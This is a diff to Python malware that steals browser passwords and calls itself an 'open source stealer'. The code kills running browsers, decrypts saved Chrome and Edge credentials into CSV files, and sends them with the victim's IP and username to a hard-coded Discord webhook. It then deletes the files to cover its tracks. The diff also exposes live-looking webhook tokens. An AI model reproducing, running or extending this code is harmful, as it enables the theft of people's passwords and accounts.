@@ -10,12 +10,14 @@ import shutil
 import csv
 from discord_webhook import DiscordWebhook
 
-ip = requests.get("https://api.ipify.org")  # just remember to do ip.text or ip.content
+ip = requests.get("https://api.ipify.org") 
 name = os.getlogin()
 cores = os.cpu_count()
-webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1344737907533025290/uqTjZWsPzE9vuHgt1aPvynOkQdl8OZFGcpSszcdZyOEyEv8pftBOXJToOs_d148rucvd", username="terry the terrible")
+avatarurl = "https://cdn.discordapp.com/attachments/1344737886972416032/1346204443166642248/stealer_logo.png?ex=67c75616&is=67c60496&hm=8db5576f0fcfdefefa793fc5a74401c37374445711a0e360e113feb24e2c42f3&"
+webhook = "https://discord.com/api/webhooks/1345694308564598865/PEck0J_cwmpsWFKKrg0ITV10G0gofNFekS2RlTU-sFp4yUEFh9IkuM1dMWH-U_SGAfhF"
+webhook_username = "open source stealer"
 
-browsers = ["chrome.exe","msedge.exe","firefox.exe","opera.exe","iexplore.exe","brave.exe","vivaldi.exe","arc.exe"]
+browsers = ["chrome.exe","msedge.exe","firefox.exe","opera.exe","iexplore.exe","brave.exe","vivaldi.exe"]
 for browser in browsers:
         kill = f"taskkill /F /IM {browser}"
         result = os.system(kill)
@@ -27,6 +29,7 @@ chromepath = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.en
 edge_localstate = os.path.normpath(r"%s\AppData\Local\Microsoft\Edge\User Data\Local State"%(os.environ['USERPROFILE']))
 edgepath = os.path.normpath(r"%s\AppData\Local\Microsoft\Edge\User Data"%(os.environ['USERPROFILE']))
 
+#chrome
 def get_secret_key():
     try:
         with open( chrome_localstate, "r", encoding='utf-8') as f:
@@ -66,9 +69,9 @@ def get_db_connection(chrome_path_login_db):
         
 if __name__ == '__main__':
     try:
-        with open('justafilethatsnotsuspicious.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
+        with open('chrome.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
             csv_writer = csv.writer(decrypt_password_file, delimiter=',')
-            csv_writer.writerow(["index","url","username","password"])
+            csv_writer.writerow(["opensourcestealer"])
             secret_key = get_secret_key()
             folders = [element for element in os.listdir(chromepath) if re.search("^Profile*|^Default$",element)!=None]
             for folder in folders:
@@ -90,6 +93,7 @@ if __name__ == '__main__':
     except Exception as e:
         print("[ERR] %s"%str(e))
 
+#edge
 def get_secret_key_edge():
     try:
         with open( edge_localstate, "r", encoding='utf-8') as f:
@@ -129,9 +133,9 @@ def get_db_connection_edge(chrome_path_login_db):
         
 if __name__ == '__main__':
     try:
-        with open('justafilethatsnotsuspicious_edge.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
+        with open('edge.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
             csv_writer = csv.writer(decrypt_password_file, delimiter=',')
-            csv_writer.writerow(["index","url","username","password"])
+            csv_writer.writerow(["opensourcestealer"])
             secret_key = get_secret_key()
             folders = [element for element in os.listdir(edgepath) if re.search("^Profile*|^Default$",element)!=None]
             for folder in folders:
@@ -155,11 +159,16 @@ if __name__ == '__main__':
 
 
 
-with open("justafilethatsnotsuspicious.csv", "rb") as f:
-    webhook.add_file(file=f.read(), filename="funny.csv")
-with open("justafilethatsnotsuspicious_edge.csv", "rb") as f:
-    webhook.add_file(file=f.read(), filename="funnier.csv")
 
-response = webhook.execute()
+respond = DiscordWebhook(avatar_url=avatarurl, url=webhook, content=f'@everyone Victim at {ip.text} called {name} with {cores} cpu cores! Passwords here:', username=webhook_username)
 
+with open("chrome.csv", "rb") as f:
+    respond.add_file(file=f.read(), filename="chrom.csv")
+with open("edge.csv", "rb") as f:
+    respond.add_file(file=f.read(), filename="edg.csv")
+
+respond.execute()
+
+os.remove("chrome.csv")
+os.remove("edge.csv")
 
